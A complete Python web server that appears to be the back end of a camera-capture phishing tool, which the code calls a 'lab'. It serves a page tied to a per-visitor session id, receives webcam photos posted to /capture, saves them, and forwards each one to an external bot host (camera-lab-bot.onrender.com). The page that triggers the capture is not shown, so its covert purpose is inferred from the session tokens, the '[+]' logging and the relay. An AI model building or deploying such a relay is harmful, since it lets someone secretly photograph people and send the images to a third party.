import re
import time
import os
import urllib.request
import urllib.error
from pathlib import Path
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = Path(__file__).resolve().parent
CAPTURES = ROOT / "captures"
CAPTURES.mkdir(exist_ok=True)

MEDIA_URL = os.environ.get(
    "MEDIA_URL",
    "https://camera-lab-bot.onrender.com",
).rstrip("/")

SESSION_ID_RE = re.compile(r"^[0-9a-f]{32}$")

class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        from urllib.parse import urlsplit, parse_qs

        parsed = urlsplit(self.path)

        if parsed.path == "/":
            session_values = parse_qs(parsed.query).get("session", [])
            session_id = session_values[0].strip() if session_values else ""

            if session_id and not SESSION_ID_RE.fullmatch(session_id):
                self.send_error(400, "invalid session")
                return

            data = (ROOT / "index.html").read_bytes()

            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
            self.send_header("Pragma", "no-cache")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        self.send_error(404)

    def do_POST(self):
        from urllib.parse import urlsplit, parse_qs, urlencode

        parsed = urlsplit(self.path)

        if parsed.path != "/capture":
            self.send_error(404)
            return

        session_values = parse_qs(parsed.query).get("session", [])
        session_id = session_values[0].strip() if session_values else ""

        if not session_id:
            self.send_error(400, "session missing")
            return

        if not SESSION_ID_RE.fullmatch(session_id):
            self.send_error(400, "invalid session")
            return

        content_type = self.headers.get("Content-Type", "")
        match = re.search(r'boundary="?([^";]+)"?', content_type)

        if not match:
            self.send_error(400, "Invalid multipart request")
            return

        boundary = match.group(1).encode()
        length = int(self.headers.get("Content-Length", "0"))

        body = self.rfile.read(length)

        marker = b'name="photo"'
        start = body.find(marker)

        if start == -1:
            self.send_error(400, "photo missing")
            return

        data_start = body.find(b"\r\n\r\n", start)

        if data_start == -1:
            self.send_error(400, "Invalid upload")
            return

        data_start += 4
        data_end = body.find(b"\r\n--" + boundary, data_start)

        if data_end == -1:
            self.send_error(400, "Invalid multipart boundary")
            return

        photo = body[data_start:data_end]

        filename = CAPTURES / f"capture-{int(time.time() * 1000)}.jpg"
        filename.write_bytes(photo)

        print(f"[+] Capture received: {len(photo)} bytes -> {filename.name}")

        boundary_out = b"----CameraLabForwardBoundary"
        body = (
            b"--" + boundary_out + b"\r\n"
            b'Content-Disposition: form-data; name="photo"; filename="' +
            filename.name.encode() + b'"\r\n'
            b"Content-Type: image/jpeg\r\n\r\n" +
            photo +
            b"\r\n--" + boundary_out + b"--\r\n"
        )

        forward_url = (
            f"{MEDIA_URL}/photo?"
            + urlencode({"session": session_id})
        )

        req = urllib.request.Request(
            forward_url,
            data=body,
            method="POST",
            headers={
                "Content-Type": (
                    "multipart/form-data; boundary=" +
                    boundary_out.decode()
                ),
                "Content-Length": str(len(body)),
            },
        )

        try:
            with urllib.request.urlopen(req, timeout=30) as response:
                result = response.read().decode("utf-8", "replace")
                print(f"[+] Media forward: HTTP {response.status} -> {result}")

                self.send_response(response.status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write(result.encode("utf-8"))
                return

        except urllib.error.HTTPError as exc:
            error = exc.read().decode("utf-8", "replace")
            print(f"[!] Media forward failed: HTTP {exc.code} -> {error}")

            self.send_response(502)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(
                f"Media forward failed: HTTP {exc.code} -> {error}".encode("utf-8")
            )
            return

        except urllib.error.URLError as exc:
            error = str(exc)
            print(f"[!] Media forward connection failed: {error}")

            self.send_response(502)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(
                f"Media forward connection failed: {error}".encode("utf-8")
            )
            return

    def log_message(self, fmt, *args):
        print(f"[{self.log_date_time_string()}] {fmt % args}")


server = ThreadingHTTPServer((os.getenv("HOST", "0.0.0.0"), int(os.getenv("PORT", "8080"))), Handler)

print("Serving lab on http://127.0.0.1:8080/")
print("Captures:", CAPTURES)

server.serve_forever()
